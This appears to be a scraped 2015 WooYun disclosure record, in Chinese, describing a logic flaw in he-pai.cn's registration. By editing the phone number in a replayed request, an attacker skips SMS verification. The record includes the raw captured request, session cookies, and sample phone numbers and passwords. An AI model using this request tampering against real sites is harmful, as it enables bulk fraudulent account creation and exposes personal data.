{"id": 49482, "wybug_id": "wooyun-2015-0127026", "wybug_title": "合拍网某业务功能逻辑错误绕过动态验证打包（影响会员帐号）", "wybug_corp": "he-pai.cn", "wybug_author": "艾薇儿", "wybug_date": "2015-07-15 21:51", "wybug_open_date": "2015-08-30 10:28", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["逻辑错误", "设计不当", "认证设计不合理"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-16：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-08-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-08-30：\t细节向公众公开  简要描述： RT 详细说明：   深圳市合拍在线互联网金融服务有限公司 注册功能逻辑错误，可使用任意手机号注册账号， 简单描述漏洞详情  正常注册流程，输入手机号，获取动态验证码，输入验证码，输入密码，下一步，，，， 最后抓到注册账号的请求 \nPOST /hponline/login/login/register.do HTTP/1.1Host: www.he-pai.cnContent-Length: 296Accept: application/json, text/javascript, */*; q=0.01Origin: http://www.he-pai.cnX-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36Content-Type: application/x-www-form-urlencoded; charset=UTF-8Referer: http://www.he-pai.cn/hponline/login/login/registerPage.do?validated=trueAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8,en;q=0.6Cookie: JSESSIONID=C77D359E5F6DA1FA36858BDA55E1946F.he-pai_2; route=29db8b684236c7c5b48fe87c54887bbc; hpResourceId=sem-baidu-cf-p-1yqlccp; fResourceId=sem-baidu-cf-p-1yqlccp; hpRefUrl=http%3A//caifu.baidu.com/wealth; rtRefUrl=http%3A//caifu.baidu.com/wealth; AtvID=brand; Uuid=2A2BFE66-C16D-4139-B9ED-F5E9DDC4CE70; Frisurl=http%3A//www.he-pai.cn/hponline/news/news/landing.do%3Fpageinfo%3Dbrand%26sourceid%3Dsem-baidu-cf-p-1yqlccp%26activitieid%3Dbrand%26utm_source%3Dbdcf; Rfiurl=http%3A//www.he-pai.cn/hponline/news/news/landing.do%3Fpageinfo%3Dbrand%26sourceid%3Dsem-baidu-cf-p-1yqlccp%26activitieid%3Dbrand%26utm_source%3Dbdcf; recid=brand; hpSourceId=sem-baidu-cf-p-1yqlccp; hpActivitieId=brand; pgv_pvi=5915449344; pgv_si=s8291059712; CNZZDATA1252980333=656212597-1436964532-http%253A%252F%252Fwww.he-pai.cn%252F%7C1436964532; hpCity=; Hm_lvt_afcd264b6b0646fb3404e1559d57c996=1436964821; Hm_lpvt_afcd264b6b0646fb3404e1559d57c996=1436964956; _gat_UA-48774440-1=1; Regurl=http%3A//www.he-pai.cn/hponline/login/login/mbCode.do%3FMB_PHN%3D13045750527%26MTS%3Dundefined%26SENDTS%3Dundefined; _fmdata=12A53263B786A1A2F50B18B2213DCB78C6A9169619693F4C695A4832BA89BA285D1A5A2F7B2B04905C1C9EDA5626FAE03D92D22CD6FE9763; _ga=GA1.2.2A2BFE66-C16D-4139-B9ED-F5E9DDC4CE70RG_NM=13045750527&RG_PWD=6846860684F05029ABCCC09A53CD66F1&RG_PWD_D=6846860684F05029ABCCC09A53CD66F1&CI_TYP=1&RCM_CD=1AEEB&MB_PHN=13045750527&CRD_NO=810775&HP_SOURCE=sem-baidu-cf-p-1yqlccp&HP_ACTIVITIE=brand&HP_REFURL=http://caifu.baidu.com/wealth&tokenId=C77D359E5F6DA1FA36858BDA55E1946F.he-pai_2\n然后再放到 Repeater中，重新发包 \n\n然后我们修改请求里面的手机号，一共有两处！在第一次测试中漏掉了，，，\n\n继续测试\n\n\n\n测试登录 \n\n\n\n证明即可，这个直接跑一个号码段！危害还是相当大的呢这个是个人用户注册功能企业用户注册功能存在相同的问题。再次打包了   漏洞证明：  \n13045750526    a11111115866886688    a11111115866886681    a111111\n   修复方案：     版权声明：转载请注明来源 艾薇儿@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-07-16 10:27 厂商回复： 该漏洞会被利用，进行自动注册，影响真实用户注册。我们将安排技术人员尽快对该漏洞进行修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}